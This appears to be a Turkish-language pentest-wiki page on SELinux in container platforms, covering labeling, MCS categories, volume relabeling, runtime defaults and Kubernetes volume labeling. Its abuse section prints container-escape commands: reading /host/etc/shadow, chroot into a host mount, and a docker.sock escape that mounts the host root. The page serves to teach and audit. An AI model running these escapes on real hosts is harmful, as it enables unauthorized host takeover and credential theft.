# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

SELinux, **etiket tabanlı Mandatory Access Control** sistemidir. İlgili her process ve object bir security context taşıyabilir; policy, hangi domain'lerin hangi type'larla ve ne şekilde etkileşime girebileceğine karar verir. Containerized ortamlarda bu genellikle runtime'ın container process'ini kısıtlanmış bir container domain'i altında başlatması ve container içeriğini karşılık gelen type'larla etiketlemesi anlamına gelir. Policy düzgün çalışıyorsa process, etiketiyle etkileşime girmesi beklenen şeyleri okuyup yazabilirken, bir mount aracılığıyla görünür hâle gelse bile diğer host içeriğine erişimi reddedilebilir.

Bu, mainstream Linux container deployment'larında kullanılabilen en güçlü host-side protection'lardan biridir. Fedora, RHEL, CentOS Stream, OpenShift ve SELinux merkezli diğer ecosystem'lerde özellikle önemlidir. Bu ortamlarda SELinux'u göz ardı eden bir reviewer, host compromise için açıkça mümkün görünen bir yolun aslında neden engellendiğini çoğu zaman yanlış anlayacaktır.

## AppArmor ve SELinux

Üst düzeydeki en kolay fark, AppArmor'un path-based, SELinux'un ise **label-based** olmasıdır. Bunun container security açısından önemli sonuçları vardır. Path-based bir policy, aynı host içeriği beklenmeyen bir mount path'i altında görünür hâle geldiğinde farklı davranabilir. Label-based bir policy ise bunun yerine object'in label'ının ne olduğunu ve process domain'inin onun üzerinde ne yapabileceğini sorar. Bu, SELinux'u basit hâle getirmez; ancak AppArmor-based sistemlerde defender'ların bazen yanlışlıkla yaptığı bir path-trick varsayımı sınıfına karşı onu daha dayanıklı kılar.

Model label odaklı olduğundan container volume yönetimi ve relabeling kararları security-critical'dır. Runtime veya operator, "mount'ları çalıştırmak" için label'ları fazla geniş kapsamlı şekilde değiştirirse workload'u contain etmesi gereken policy boundary, amaçlanandan çok daha zayıf hâle gelebilir.

## Lab

SELinux'un host üzerinde etkin olup olmadığını görmek için:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Host üzerindeki mevcut etiketleri incelemek için:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Etiketlemenin devre dışı bırakıldığı çalıştırmayla normal çalıştırmayı karşılaştırmak için:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux etkinleştirilmiş bir host üzerinde bu, beklenen container domain'i altında çalışan bir workload ile bu enforcement katmanı kaldırılmış olan arasındaki farkı gösterdiği için oldukça pratik bir demonstrasyondur.

## Runtime Kullanımı

Podman, SELinux'un platform varsayılanının bir parçası olduğu sistemlerde SELinux ile özellikle iyi uyumludur. Rootless Podman ile SELinux'un birlikte kullanılması, süreç host tarafında zaten unprivileged olduğu ve hâlâ MAC policy tarafından sınırlandırıldığı için en güçlü mainstream container temellerinden biridir. Docker da desteklenen ortamlarda SELinux'u kullanabilir, ancak yöneticiler volume-labeling kaynaklı sorunları aşmak için bazen SELinux'u devre dışı bırakır. CRI-O ve OpenShift, container izolasyonu yaklaşımlarının bir parçası olarak büyük ölçüde SELinux'a güvenir. Kubernetes de SELinux ile ilgili ayarları sunabilir, ancak bunların değeri açıkça node OS'nin gerçekten SELinux'u destekleyip enforcement uygulamasına bağlıdır.<sup>[[2]](#references)</sup>

Tekrarlanan ders şudur: SELinux isteğe bağlı bir süs değildir. Onun etrafında oluşturulan ecosystem'lerde beklenen security boundary'nin bir parçasıdır. Host tarafındaki policy enumeration, transition analysis ve SELinux administration tools'un kötüye kullanımı için [general SELinux page](../../../interesting-files-permissions/selinux.md) sayfasına bakın.

## MCS Kategorileri ve Volume Relabeling

Container izolasyonu normalde **type enforcement** ile **Multi-Category Security (MCS)** birleşiminden oluşur. İki süreç de `container_t` olarak çalışabilir, ancak `s0:c123,c456` ve `s0:c321,c654` gibi farklı seviyeler alabilir. Private container içeriği, eşleşen kategorilerle birlikte `container_file_t` olarak etiketlenir; bu nedenle başka bir container'ın path'ine ulaşmak tek başına ona erişmek için yeterli değildir. Runtime'lar normalde kategori çiftini kendileri atar; bir level'ı manuel olarak yeniden kullanmak, container'lar arasındaki bu ayrımı kasıtlı olarak ortadan kaldırır.<sup>[[3]](#references)</sup>

Yalnızca type'ı kontrol etmek yerine process ve mount label'larını karşılaştırın:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-mount son ekleri host inode etiketlerini değiştirir ve bu nedenle yalnızca mount metadata'sını değil, security boundary'yi de değiştirir:<sup>[[3]](#references)</sup>

- `:Z`, container'ın MCS kategorileriyle private bir etiket uygular. Tek bir container veya Pod tarafından sahip olunan bir volume için uygundur.
- `:z`, diğer confined container'ların da içeriği kullanabilmesi için shared bir etiket uygular (DAC permissions'a tabidir). Bunu secrets veya tenant-specific data için kullanmak, aksi hâlde container'ları birbirinden ayıracak MCS isolation'ı ortadan kaldırır.
- Relabeling recursive'dir. Her iki option'dan birini `/`, `/etc`, `/usr` gibi geniş host tree'lerine veya tüm bir home tree'sine uygulamak hem içeriği seçilen container'a açabilir hem de beklenen etiketleri değiştirerek host servislerinin çalışmasını durdurabilir.

Manual level reuse, command lines ve manifests içinde kolayca fark edilir. Aşağıdaki iki container'a kasıtlı olarak aynı MCS level verilir ve bu nedenle bu level için etiketlenmiş içeriği kullanabilirler:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Ayrıca `label=nested` ile `label=disable` arasındaki farkı da gözetin: İlki, container içindeki SELinux işlemlerini açığa çıkarır ve label değişikliklerine yalnızca policy izin verdiği yerlerde izin verir; ikincisi ise ilgili workload için label ayrımını kaldırır. Her ikisi de incelenmelidir, ancak eşdeğer değildir.<sup>[[3]](#references)</sup>

## Yanlış yapılandırmalar

Klasik hata `label=disable` kullanmaktır. Operasyonel olarak bu genellikle bir volume mount reddedildiğinde, labeling modelini düzeltmek yerine SELinux'u denklemden çıkarmanın en hızlı kısa vadeli çözüm olarak görülmesiyle gerçekleşir.<sup>[[1]](#references)</sup> Bir diğer yaygın hata, host içeriğinin yanlış şekilde yeniden etiketlenmesidir. Geniş kapsamlı relabel işlemleri uygulamanın çalışmasını sağlayabilir, ancak container'ın erişmesine izin verilen alanı başlangıçta amaçlanandan çok daha fazla genişletebilir.

**Kurulu** SELinux ile **etkin** SELinux'u birbirine karıştırmamak da önemlidir. Bir host SELinux'u desteklediği hâlde permissive modda olabilir veya runtime workload'u beklenen domain altında başlatmıyor olabilir. Bu durumlarda koruma, dokümantasyonun düşündürebileceğinden çok daha zayıftır.

## Kötüye kullanım

SELinux mevcut olmadığında, permissive modda olduğunda veya workload için geniş kapsamlı şekilde devre dışı bırakıldığında, host'a mount edilmiş path'lerin kötüye kullanılması çok daha kolay hâle gelir. Aksi durumda label'lar tarafından kısıtlanacak olan aynı bind mount, host verilerine veya host üzerinde değişiklik yapmaya doğrudan bir yol sağlayabilir. Bu durum özellikle writable volume mount'ları, container runtime dizinleri veya kolaylık amacıyla hassas host path'lerini açığa çıkaran operasyonel kestirmelerle birlikte kullanıldığında önemlidir.

SELinux, generic breakout writeup'ının bir host'ta neden hemen çalıştığını, ancak runtime flag'leri benzer olmasına rağmen başka bir host'ta tekrar tekrar başarısız olduğunu çoğu zaman açıklar. Eksik olan bileşen çoğunlukla bir namespace veya capability değil, yerinde kalan bir label sınırıdır.

En hızlı pratik kontrol, etkin context'i karşılaştırmak ve ardından normalde label'larla kısıtlanması gereken mount edilmiş host path'lerini veya runtime dizinlerini test etmektir:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Bir host bind mount mevcutsa ve SELinux etiketleme devre dışı bırakılmış veya zayıflatılmışsa, genellikle ilk olarak bilgi ifşası meydana gelir:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Mount yazılabilir durumdaysa ve container, kernel bakış açısından fiilen host-root ise bir sonraki adım, tahminde bulunmak yerine kontrollü host değişikliği yapmayı test etmektir:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux destekli host'larda, runtime state dizinlerindeki label'ların kaybedilmesi doğrudan privilege-escalation yollarını da açığa çıkarabilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Bu komutlar tam bir escape chain'in yerini tutmaz, ancak host data access'i veya host-side file modification'ı engelleyen şeyin SELinux olup olmadığını çok hızlı bir şekilde netleştirir.

### Tam Örnek: SELinux Disabled + Writable Host Mount

SELinux labeling devre dışı bırakılmışsa ve host filesystem `/host` konumuna writable olarak mount edilmişse, tam bir host escape normal bir bind-mount abuse vakasına dönüşür:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot` başarılı olursa, container işlemi artık host dosya sisteminden çalışır:
```bash
id
hostname
cat /etc/passwd | tail
```
### Tam Örnek: SELinux Devre Dışı + Runtime Directory

İş yükü, labels devre dışı bırakıldıktan sonra bir runtime socket'e erişebiliyorsa kaçış runtime'a devredilebilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Önemli gözlem, SELinux'un genellikle tam olarak bu tür host-path veya runtime-state erişimini engelleyen kontrol mekanizması olmasıdır.

## Kontroller

SELinux kontrollerinin amacı, SELinux'un etkin olduğunu doğrulamak, mevcut security context'i belirlemek ve ilgilendiğiniz dosya veya path'lerin gerçekten label ile sınırlandırılıp sınırlandırılmadığını görmektir.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Burada ilgi çekici olanlar:

- `getenforce` ideal olarak `Enforcing` döndürmelidir; `Permissive` veya `Disabled`, SELinux bölümünün tamamının anlamını değiştirir.
- Mevcut process context beklenmedik veya gereğinden geniş görünüyorsa workload, amaçlanan container policy altında çalışmıyor olabilir.
- Host tarafından mount edilmiş dosyaların veya runtime dizinlerinin process'in gereğinden fazla erişebileceği etiketlere sahip olması, bind mount'ları çok daha tehlikeli hâle getirir.

SELinux destekli bir platformda container incelerken labeling'i ikincil bir ayrıntı olarak değerlendirmeyin. Çoğu durumda host'un henüz compromise edilmemiş olmasının başlıca nedenlerinden biridir.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Host'a bağlı | SELinux etkin host'larda SELinux separation kullanılabilir, ancak kesin davranış host/daemon yapılandırmasına bağlıdır | `--security-opt label=disable`, bind mount'ların geniş kapsamlı yeniden etiketlenmesi, `--privileged` |
| Podman | SELinux host'larında genellikle etkin | Devre dışı bırakılmadığı sürece SELinux separation, SELinux sistemlerinde Podman'ın normal bir parçasıdır | `--security-opt label=disable`, `containers.conf` içinde `label=false`, `--privileged` |
| Kubernetes | SELinux node'larında runtime tarafından atanır; açıkça yapılandırılabilir | Pod bir label belirlemediğinde runtime benzersiz bir label atayabilir. Açık `securityContext.seLinuxOptions`, Pod/volume label'ını kontrol eder; Kubernetes 1.37'de uygun volume'lar varsayılan olarak SELinux mount labeling kullanır | yinelenen MCS level'ları, permissive/disabled node'lar, geniş yetkili privileged workload'lar, ayrım gözetmeden `seLinuxChangePolicy: Recursive` kullanımı <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift tarzı deployment'lar | Genellikle yoğun biçimde kullanılır | SELinux, bu ortamlardaki node isolation modelinin çoğu zaman temel bir parçasıdır | Erişimi gereğinden fazla genişleten custom policy'ler, uyumluluk amacıyla labeling'in devre dışı bırakılması |

SELinux varsayılanları seccomp varsayılanlarına kıyasla dağıtıma daha fazla bağlıdır. Fedora/RHEL/OpenShift tarzı sistemlerde SELinux, isolation modelinin çoğu zaman merkezindedir. SELinux olmayan sistemlerde ise tamamen yoktur.

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37, `SELinuxMount` özelliğini stable hâle getirdi ve varsayılan olarak etkinleştirdi. Uygun bir PVC, `seLinuxOptions` içeren bir Pod ve `.spec.seLinuxMount: true` bildiren bir CSI driver için kubelet, runtime'dan her inode'u recursive olarak yeniden etiketlemesini istemek yerine `-o context=<label>` kullanır. Desteklenmeyen driver'lar ve volume türleri yine recursive yolu kullanır. Bu yaklaşım, büyük bir yeniden etiketleme taramasını önler ve volume'u bir Pod'a sunmak için her dosyanın kalıcı label'larını değiştirme gereğini de ortadan kaldırır.<sup>[[2]](#references)[[4]](#references)</sup>

Bir mount yalnızca tek bir context taşıyabilir. Sonuç olarak, aynı node üzerinde aynı uygun volume'u kullanan **farklı SELinux label'larına** sahip Pod'lar, varsayılan `MountOption` davranışı altında artık birlikte çalışamaz: Pod'lardan biri `conflicting SELinux labels of volume` hatasıyla `ContainerCreating` durumunda kalır. Bunu hem bir availability sorunu hem de workload'ların MCS sınırları arasında storage'ı örtük olarak paylaştığına dair yararlı bir gösterge olarak değerlendirin. Bu paylaşım kasıtlıysa—örneğin aynı volume'u kullanan privileged bir `spc_t` Pod ile confined bir Pod söz konusuysa—Pod başına uyumluluk çıkış yolu `seLinuxChangePolicy: Recursive` kullanmaktır; runtime'ın hangi path'leri yeniden etiketleyeceğini anlamadan bunu cluster genelinde uygulamayın.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Küme tarafında faydalı kontroller:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
İsteğe bağlı kube-controller-manager `selinux-warning-controller`, uyumsuz etiketleri paylaşan Pod'ları algılar ve `selinux_warning_controller_selinux_volume_conflict` metriğini kullanıma sunar. Yükseltmelerden veya volume label davranışını değiştirmeden önce bunu etkinleştirip inceleyin; gerçek bir policy çakışmasını sıradan bir CSI ya da filesystem hatasından ayırt etmeye yardımcı olur.<sup>[[2]](#references)</sup>

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Pod veya Container için Security Context Yapılandırma](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman run documentation: SELinux labels and volume relabeling](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 release: SELinuxMount and SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
